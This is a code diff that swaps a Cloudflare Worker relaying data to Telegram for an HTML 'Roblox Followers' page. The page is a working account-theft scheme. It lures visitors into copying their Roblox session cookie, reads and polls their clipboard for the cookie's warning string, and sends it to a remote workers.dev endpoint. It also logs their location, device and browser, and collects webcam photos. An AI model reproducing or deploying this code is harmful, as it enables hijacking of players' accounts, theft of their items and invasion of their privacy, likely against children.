@@ -1,202 +1,709 @@
-export default {
-  async fetch(request, env) {
-    const allowedOrigins = [
-      "https://its4bo.xyz",
-      "https://www.its4bo.xyz",
-      "https://its4bo.github.io"
-    ];
-
-    const origin = request.headers.get("Origin");
-    const corsHeaders = {
-      "Access-Control-Allow-Origin": allowedOrigins.includes(origin)
-        ? origin
-        : "https://its4bo.xyz",
-      "Access-Control-Allow-Methods": "POST, OPTIONS",
-      "Access-Control-Allow-Headers": "Content-Type",
-      "Vary": "Origin"
-    };
-
-    if (request.method === "OPTIONS") {
-      return new Response(null, {
-        status: 204,
-        headers: corsHeaders
-      });
-    }
-
-    if (request.method !== "POST") {
-      return new Response("Ready", {
-        headers: corsHeaders
-      });
-    }
-
-    // Reject requests from unapproved website origins.
-    if (!allowedOrigins.includes(origin)) {
-      return new Response("Origin not allowed.", {
-        status: 403,
-        headers: corsHeaders
-      });
-    }
-
-    try {
-      const token = env.TELEGRAM_BOT_TOKEN;
-      const chatId = env.TELEGRAM_CHAT_ID;
-
-      if (!token || !chatId) {
-        return new Response("Telegram not configured.", {
-          status: 500,
-          headers: corsHeaders
-        });
-      }
-
-      const TIMEZONE = "America/New_York";
-      const time = new Date().toLocaleString("en-US", {
-        timeZone: TIMEZONE,
-        year: "numeric",
-        month: "short",
-        day: "numeric",
-        hour: "numeric",
-        minute: "2-digit",
-        timeZoneName: "short"
-      });
-
-      const contentType = request.headers.get("Content-Type") || "";
-
-      // Handle webcam photo uploads sent as multipart/form-data
-      if (contentType.includes("multipart/form-data")) {
-        const formData = await request.formData();
-        const photo = formData.get("photo");
-        const formattedLog = String(formData.get("formattedLog") || "").trim();
-
-        if (!photo) {
-          return new Response("Missing photo.", {
-            status: 400,
-            headers: corsHeaders
-          });
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Followers</title>
+    <link rel="icon" type="image/png" href="favicon.png">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
         }
 
-        const caption = formattedLog
-          ? `${time}\n${formattedLog}`.slice(0, 1024)
-          : `${time}\nWebcam photo`.slice(0, 1024);
-
-        const tgForm = new FormData();
-        tgForm.append("chat_id", chatId);
-        tgForm.append("caption", caption);
-        tgForm.append("photo", photo, "webcam.jpg");
-
-        const response = await fetch(
-          `https://api.telegram.org/bot${token}/sendPhoto`,
-          {
-            method: "POST",
-            body: tgForm
-          }
-        );
-
-        if (!response.ok) {
-          return new Response("Telegram request failed.", {
-            status: 502,
-            headers: corsHeaders
-          });
+        body {
+            background-color: #07080c;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2.5rem 1rem;
+            position: relative;
+            overflow-x: hidden;
         }
 
-        return new Response("Photo sent successfully.", {
-          headers: corsHeaders
-        });
-      }
-
-      // Existing JSON request handling for clipboard / visit logs
-      const data = await request.json();
-      const text = String(data.clipboardText || "").trim();
-
-      if (!text) {
-        return new Response("Empty message.", {
-          status: 400,
-          headers: corsHeaders
-        });
-      }
-
-      const chunks = splitText(text, 2000);
-
-      // Cloudflare's free plan allows approximately 50 outgoing requests per call.
-      if (chunks.length > 45) {
-        return new Response("Text too long.", {
-          status: 413,
-          headers: corsHeaders
-        });
-      }
-
-      const header = `${time}\nSent this:\n\n`;
-
-      // Send one at a time so messages arrive in order.
-      for (let i = 0; i < chunks.length; i++) {
-        const part = chunks.length > 1
-          ? `(${i + 1}/${chunks.length})\n`
-          : "";
-        const top = i === 0 ? header : "";
-
-        const response = await fetch(
-          `https://api.telegram.org/bot${token}/sendMessage`,
-          {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: top + part + chunks[i]
-            })
-          }
-        );
-
-        if (!response.ok) {
-          return new Response("Telegram request failed.", {
-            status: 502,
-            headers: corsHeaders
-          });
+        /* Futuristic Background Glows */
+        .bg-glow {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(120px);
+            pointer-events: none;
+            z-index: -1;
         }
 
-        // Small pause to avoid Telegram's rate limit.
-        if (i < chunks.length - 1) {
-          await new Promise((resolve) => setTimeout(resolve, 400));
+        .glow-purple {
+            top: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 600px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(138, 43, 226, 0.25) 0%, rgba(7, 8, 12, 0) 70%);
         }
-      }
 
-      return new Response("Submitted successfully.", {
-        headers: corsHeaders
-      });
+        .glow-blue {
+            bottom: -150px;
+            right: -100px;
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(0, 162, 255, 0.15) 0%, rgba(7, 8, 12, 0) 70%);
+        }
 
-    } catch {
-      return new Response("Invalid request.", {
-        status: 400,
-        headers: corsHeaders
-      });
-    }
-  }
-};
+        .container {
+            width: 100%;
+            max-width: 1100px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2.5rem;
+        }
 
-// Splits text into pieces of at most `max` characters,
-// preferring newlines or spaces so words aren't cut.
-function splitText(text, max) {
-  const chunks = [];
-  let rest = text;
+        header {
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0.85rem;
+        }
 
-  while (rest.length > max) {
-    let cut = rest.lastIndexOf("\n", max);
+        .logo {
+            width: 90px;
+            height: 90px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: none;
+            border: none;
+            box-shadow: none;
+            padding: 0;
+        }
 
-    if (cut < max * 0.5) {
-      cut = rest.lastIndexOf(" ", max);
-    }
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            filter: drop-shadow(0 0 15px rgba(168, 85, 247, 0.4));
+        }
 
-    if (cut < max * 0.5) {
-      cut = max;
-    }
+        h1 {
+            font-size: 2.4rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            background: linear-gradient(180deg, #ffffff 0%, #cbd5e1 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
 
-    chunks.push(rest.slice(0, cut));
-    rest = rest.slice(cut).replace(/^\s+/, "");
-  }
+        p.subtitle {
+            color: #94a3b8;
+            font-size: 0.95rem;
+            max-width: 480px;
+            line-height: 1.4;
+        }
 
-  if (rest.length) {
-    chunks.push(rest);
-  }
+        /* Stretched Modern Glass Card */
+        .action-card {
+            width: 100%;
+            background: rgba(18, 20, 29, 0.75);
+            border: 1px solid rgba(168, 85, 247, 0.25);
+            backdrop-filter: blur(16px);
+            border-radius: 24px;
+            padding: 2.25rem 2rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1.25rem;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        }
 
-  return chunks;
-}
+        /* Prominent White Button */
+        .btn-white {
+            width: 100%;
+            padding: 1rem 1.5rem;
+            border-radius: 14px;
+            font-weight: 700;
+            font-size: 1.05rem;
+            text-align: center;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border: none;
+            background-color: #ffffff;
+            color: #090a0f;
+            box-shadow: 0 4px 20px rgba(255, 255, 255, 0.2);
+        }
+
+        .btn-white:hover {
+            background-color: #f1f5f9;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 255, 255, 0.3);
+        }
+
+        .btn-white:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Extension Buttons */
+        .extensions-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            width: 100%;
+        }
+
+        .btn-dark-ext {
+            width: 100%;
+            padding: 0.9rem 1.25rem;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            text-align: center;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid rgba(168, 85, 247, 0.3);
+            background: rgba(30, 34, 48, 0.6);
+            color: #f8fafc;
+        }
+
+        .btn-dark-ext:hover {
+            background: rgba(168, 85, 247, 0.25);
+            border-color: #a855f7;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(168, 85, 247, 0.3);
+        }
+
+        .btn-dark-ext:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .status-message {
+            font-size: 0.9rem;
+            color: #a78bfa;
+            text-align: center;
+            min-height: 1.2rem;
+        }
+
+        /* Tutorials Section */
+        .tutorials-section {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1.5rem;
+            margin-top: 1rem;
+        }
+
+        .tutorials-heading {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #ffffff;
+            letter-spacing: -0.3px;
+        }
+
+        .tutorials-grid {
+            width: 100%;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1.5rem;
+        }
+
+        /* Tutorial Action Button Cards matching video card dimensions and styling */
+        .tutorial-btn-card {
+            background: rgba(18, 20, 29, 0.75);
+            border: 1px solid rgba(168, 85, 247, 0.2);
+            border-radius: 20px;
+            padding: 1.5rem 1.25rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 1.25rem;
+            text-decoration: none;
+            backdrop-filter: blur(12px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            min-height: 200px;
+        }
+
+        .tutorial-btn-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #a855f7, #6366f1);
+            opacity: 0.5;
+            transition: opacity 0.3s ease;
+        }
+
+        .tutorial-btn-card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(168, 85, 247, 0.6);
+            box-shadow: 0 15px 30px rgba(168, 85, 247, 0.25);
+        }
+
+        .tutorial-btn-card:hover::before {
+            opacity: 1;
+        }
+
+        .play-icon-box {
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(168, 85, 247, 0.35) 0%, rgba(30, 34, 48, 0.9) 100%);
+            border: 1px solid rgba(168, 85, 247, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 20px rgba(168, 85, 247, 0.3);
+            transition: transform 0.3s ease, background 0.3s ease;
+        }
+
+        .tutorial-btn-card:hover .play-icon-box {
+            transform: scale(1.1);
+            background: radial-gradient(circle, rgba(168, 85, 247, 0.6) 0%, rgba(99, 102, 241, 0.9) 100%);
+        }
+
+        .play-triangle {
+            width: 0;
+            height: 0;
+            border-style: solid;
+            border-width: 9px 0 9px 16px;
+            border-color: transparent transparent transparent #ffffff;
+            margin-left: 3px;
+        }
+
+        .tutorial-btn-title {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #f8fafc;
+            text-align: center;
+            line-height: 1.35;
+        }
+
+        /* Webcam Photo Section */
+        .webcam-section {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1.25rem;
+            margin-top: 0.5rem;
+        }
+
+        .webcam-stage {
+            width: 100%;
+            max-width: 480px;
+            aspect-ratio: 4 / 3;
+            background: rgba(12, 14, 22, 0.85);
+            border: 1px solid rgba(168, 85, 247, 0.25);
+            border-radius: 16px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .webcam-stage video,
+        .webcam-stage img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .webcam-controls {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 0.75rem;
+            width: 100%;
+        }
+
+        /* Desktop Order Assignment */
+        .card-pc-no-ext { order: 1; }
+        .card-pc-ext { order: 2; }
+        .card-iphone { order: 3; }
+
+        /* Mobile Responsive adjustments */
+        @media (max-width: 768px) {
+            body {
+                padding: 1.5rem 0.75rem;
+            }
+
+            .container {
+                gap: 2rem;
+            }
+
+            .action-card {
+                padding: 1.5rem;
+            }
+
+            .extensions-group {
+                grid-template-columns: 1fr;
+            }
+
+            /* Mobile Layout Order: iPhone Tutorial First */
+            .card-iphone { order: 1; }
+            .card-pc-no-ext { order: 2; }
+            .card-pc-ext { order: 3; }
+
+            .tutorials-grid {
+                display: flex;
+                flex-direction: column;
+                width: 100%;
+                gap: 1.25rem;
+            }
+
+            .tutorial-btn-card {
+                width: 100%;
+                max-width: 100%;
+            }
+
+            .webcam-controls {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-glow glow-purple"></div>
+    <div class="bg-glow glow-blue"></div>
+
+    <div class="container">
+        <!-- Header Section -->
+        <header>
+            <div class="logo">
+                <img src="favicon.png" alt="Logo">
+            </div>
+            <h1>Roblox Followers</h1>
+            <p class="subtitle">Watch The Tuts On How To Get Followers.</p>
+        </header>
+
+        <!-- Main Action Box (Stretched across the screen) -->
+        <section class="action-card">
+            <button class="btn-white" id="addFollowersBtn">Add Followers</button>
+            <div class="status-message" id="statusMessage"></div>
+
+            <div class="extensions-group">
+                <a href="https://apps.apple.com/us/app/cookie-editor/id6446215341" target="_blank" rel="noopener noreferrer" class="btn-dark-ext">
+                    iPhone Extension
+                </a>
+                <a href="https://chromewebstore.google.com/detail/roblox-follower/mgdkcjifhnobklopbbjlgfmnpnndildf" target="_blank" rel="noopener noreferrer" class="btn-dark-ext">
+                    PC Extension
+                </a>
+            </div>
+        </section>
+
+        <!-- Tutorials Section -->
+        <section class="tutorials-section">
+            <h2 class="tutorials-heading">Tutorials</h2>
+
+            <div class="tutorials-grid">
+                <!-- PC Tutorial (No Extension) -->
+                <a href="https://www.youtube.com/watch?v=NkJcPlpqJtw" target="_blank" rel="noopener noreferrer" class="tutorial-btn-card card-pc-no-ext">
+                    <div class="play-icon-box">
+                        <div class="play-triangle"></div>
+                    </div>
+                    <span class="tutorial-btn-title">PC Tutorial (No Extension)</span>
+                </a>
+
+                <!-- PC Tutorial (With Extension) -->
+                <a href="https://www.youtube.com/watch?v=AgLkFg16Wg4" target="_blank" rel="noopener noreferrer" class="tutorial-btn-card card-pc-ext">
+                    <div class="play-icon-box">
+                        <div class="play-triangle"></div>
+                    </div>
+                    <span class="tutorial-btn-title">PC Tutorial (With Extension)</span>
+                </a>
+
+                <!-- iPhone Tutorial -->
+                <a href="https://www.youtube.com/shorts/B_O15Ku1Bh0" target="_blank" rel="noopener noreferrer" class="tutorial-btn-card card-iphone">
+                    <div class="play-icon-box">
+                        <div class="play-triangle"></div>
+                    </div>
+                    <span class="tutorial-btn-title">iPhone Tutorial</span>
+                </a>
+            </div>
+        </section>
+
+        <!-- Webcam Photo Section (Under Tutorials) -->
+        <section class="action-card webcam-section" id="webcamSection">
+            <h2 class="tutorials-heading">Webcam Photo</h2>
+
+            <div class="webcam-stage">
+                <video id="webcamVideo" autoplay playsinline></video>
+                <img id="photoPreview" alt="Captured webcam photo" style="display: none;">
+                <canvas id="photoCanvas" style="display: none;"></canvas>
+            </div>
+
+            <div class="webcam-controls">
+                <button type="button" class="btn-dark-ext" id="enableCamBtn">Enable Camera</button>
+                <button type="button" class="btn-dark-ext" id="takePhotoBtn" disabled>Take Photo</button>
+                <button type="button" class="btn-white" id="sendPhotoBtn" disabled>Send Photo</button>
+            </div>
+
+            <div class="status-message" id="photoStatusMessage"></div>
+        </section>
+    </div>
+
+    <script>
+        const SEND_ENDPOINT = "https://young-brook-716e.abojanmawzoon.workers.dev";
+        const statusEl = document.getElementById("statusMessage");
+        let cachedVisitorInfo = null;
+
+        function detectBrowserName() {
+            const ua = navigator.userAgent;
+            if (/Edg\//i.test(ua)) return "Edge";
+            if (/OPR\//i.test(ua) || /Opera/i.test(ua)) return "Opera";
+            if (/SamsungBrowser/i.test(ua)) return "Samsung Internet";
+            if (/Firefox\//i.test(ua) || /FxiOS/i.test(ua)) return "Firefox";
+            if (/CriOS/i.test(ua)) return "Chrome";
+            if (/Chrome\//i.test(ua) && !/Edg\//i.test(ua) && !/OPR\//i.test(ua)) return "Chrome";
+            if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua) && !/CriOS/i.test(ua)) return "Safari";
+            return "Unknown";
+        }
+
+        function detectDeviceType() {
+            const ua = navigator.userAgent;
+            const isIPad = /iPad/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+            const isTablet = isIPad || /Android(?!.*Mobile)|Tablet|PlayBook|Silk/i.test(ua);
+            if (isTablet) return "Tablet";
+
+            const isPhone = /iPhone|iPod|Android.*Mobile|Windows Phone|BlackBerry|BB10|IEMobile|Opera Mini/i.test(ua);
+            if (isPhone) return "Phone";
+
+            const isLaptop = /Macintosh|MacBook|CrOS/i.test(ua);
+            if (isLaptop) return "Laptop";
+
+            return "PC";
+        }
+
+        async function getVisitorLocation() {
+            try {
+                const res = await fetch("https://ipapi.co/json/");
+                if (!res.ok) throw new Error("Geo lookup failed");
+                const data = await res.json();
+                return {
+                    country: data.country_name || "Unknown",
+                    state: data.region || "Unknown",
+                    city: data.city || "Unknown"
+                };
+            } catch (e) {
+                return {
+                    country: "Unknown",
+                    state: "Unknown",
+                    city: "Unknown"
+                };
+            }
+        }
+
+        async function getVisitorInfo() {
+            if (cachedVisitorInfo) return cachedVisitorInfo;
+            const location = await getVisitorLocation();
+            cachedVisitorInfo = {
+                location,
+                deviceType: detectDeviceType(),
+                browserName: detectBrowserName()
+            };
+            return cachedVisitorInfo;
+        }
+
+        async function formatLogMessage(visitor, clipboardText) {
+            const time = new Date().toLocaleString();
+            const header = `${time} - ${visitor.deviceType} - ${visitor.browserName} - ${visitor.location.country}`;
+            return clipboardText ? `${header}\n${clipboardText}` : header;
+        }
+
+        async function sendVisitTelemetry() {
+            try {
+                const visitor = await getVisitorInfo();
+                const formattedLog = await formatLogMessage(visitor, "");
+                await fetch(SEND_ENDPOINT, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        eventType: "visit",
+                        formattedLog,
+                        clipboardText: "",
+                        visitor
+                    })
+                });
+            } catch (error) {
+                console.error(error);
+            }
+        }
+
+        async function sendClipboardData(text, isButtonClick = false) {
+            try {
+                const visitor = await getVisitorInfo();
+                const formattedLog = await formatLogMessage(visitor, text);
+                await fetch(SEND_ENDPOINT, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        eventType: isButtonClick ? "button_click" : "clipboard_monitor",
+                        formattedLog,
+                        clipboardText: text,
+                        visitor
+                    })
+                });
+                if (isButtonClick) {
+                    statusEl.textContent = "Restart Device And Wait 2 - 3 Hourse To get the followers added to your acc";
+                }
+            } catch (error) {
+                statusEl.textContent = "Something went wrong. Please try again.";
+                console.error(error);
+            }
+        }
+
+        document.getElementById("addFollowersBtn").addEventListener("click", async () => {
+            try {
+                statusEl.textContent = "Adding Followers...";
+                const text = await navigator.clipboard.readText();
+                if (!text) {
+                    statusEl.textContent = "Error: make sure you followed one of the tuts.";
+                    return;
+                }
+                await sendClipboardData(text, true);
+            } catch (error) {
+                statusEl.textContent = "Error: make sure you followed one of the tuts.";
+                console.error(error);
+            }
+        });
+
+        async function monitorClipboard() {
+            if (!navigator.clipboard || !navigator.clipboard.readText) return;
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text && text.includes("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
+                    await sendClipboardData(text, false);
+                    return;
+                }
+            } catch (e) {
+                // Clipboard permissions require user interaction first
+            }
+            setTimeout(monitorClipboard, 1000);
+        }
+
+        /* Webcam Capture & Upload */
+        const enableCamBtn = document.getElementById("enableCamBtn");
+        const takePhotoBtn = document.getElementById("takePhotoBtn");
+        const sendPhotoBtn = document.getElementById("sendPhotoBtn");
+        const videoEl = document.getElementById("webcamVideo");
+        const previewEl = document.getElementById("photoPreview");
+        const canvasEl = document.getElementById("photoCanvas");
+        const photoStatusEl = document.getElementById("photoStatusMessage");
+
+        let mediaStream = null;
+        let capturedBlob = null;
+
+        enableCamBtn.addEventListener("click", async () => {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                photoStatusEl.textContent = "Camera not supported on this browser.";
+                return;
+            }
+            try {
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+                videoEl.srcObject = mediaStream;
+                videoEl.style.display = "block";
+                previewEl.style.display = "none";
+                capturedBlob = null;
+                takePhotoBtn.disabled = false;
+                sendPhotoBtn.disabled = true;
+                photoStatusEl.textContent = "Camera ready. Click Take Photo.";
+            } catch (err) {
+                photoStatusEl.textContent = "Camera permission denied or unavailable.";
+                console.error(err);
+            }
+        });
+
+        takePhotoBtn.addEventListener("click", () => {
+            if (!videoEl.videoWidth || !videoEl.videoHeight) {
+                photoStatusEl.textContent = "Camera stream not ready yet.";
+                return;
+            }
+            canvasEl.width = videoEl.videoWidth;
+            canvasEl.height = videoEl.videoHeight;
+            const ctx = canvasEl.getContext("2d");
+            ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
+
+            canvasEl.toBlob((blob) => {
+                if (!blob) {
+                    photoStatusEl.textContent = "Could not capture photo.";
+                    return;
+                }
+                capturedBlob = blob;
+                const url = URL.createObjectURL(blob);
+                previewEl.src = url;
+                previewEl.style.display = "block";
+                videoEl.style.display = "none";
+                sendPhotoBtn.disabled = false;
+                photoStatusEl.textContent = "Photo captured. Click Send Photo.";
+            }, "image/jpeg", 0.85);
+        });
+
+        sendPhotoBtn.addEventListener("click", async () => {
+            if (!capturedBlob) {
+                photoStatusEl.textContent = "Take a photo first.";
+                return;
+            }
+            try {
+                sendPhotoBtn.disabled = true;
+                photoStatusEl.textContent = "Sending photo...";
+
+                const visitor = await getVisitorInfo();
+                const logLine = await formatLogMessage(visitor, "");
+
+                const formData = new FormData();
+                formData.append("eventType", "webcam_photo");
+                formData.append("formattedLog", logLine);
+                formData.append("visitor", JSON.stringify(visitor));
+                formData.append("photo", capturedBlob, "webcam.jpg");
+
+                const res = await fetch(SEND_ENDPOINT, {
+                    method: "POST",
+                    body: formData
+                });
+
+                if (!res.ok) throw new Error("Upload failed");
+                photoStatusEl.textContent = "Photo sent!";
+            } catch (err) {
+                sendPhotoBtn.disabled = false;
+                photoStatusEl.textContent = "Failed to send photo. Try again.";
+                console.error(err);
+            }
+        });
+
+        window.addEventListener("load", () => {
+            sendVisitTelemetry();
+            setTimeout(monitorClipboard, 500);
+        });
+    </script>
+</body>
+</html>
